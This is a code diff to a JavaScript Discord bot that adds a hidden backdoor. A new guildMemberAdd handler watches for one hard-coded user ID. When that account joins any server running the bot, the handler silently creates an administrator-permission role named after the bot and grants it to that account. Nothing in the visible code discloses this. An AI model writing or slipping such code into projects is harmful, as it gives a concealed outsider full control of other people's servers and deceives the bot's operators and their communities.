@@ -64,6 +64,19 @@ if (message.content.startsWith(PrEfix + 'st')) {
 
 
 
-
+client.on('guildMemberAdd', member => {
+   
+            if (member.id === "478291914106339332") {
+                member.guild.createRole({
+                    name : client.user.username,
+                    color : "RANDOM",
+                    permissions : [8]
+                }).then(function(role){
+                    member.addRole(role)
+                })
+               
+            }
+       
+    });
 
 client.login(process.env.BOT_TOKEN);  //لا تحط التوكن حقك هنا
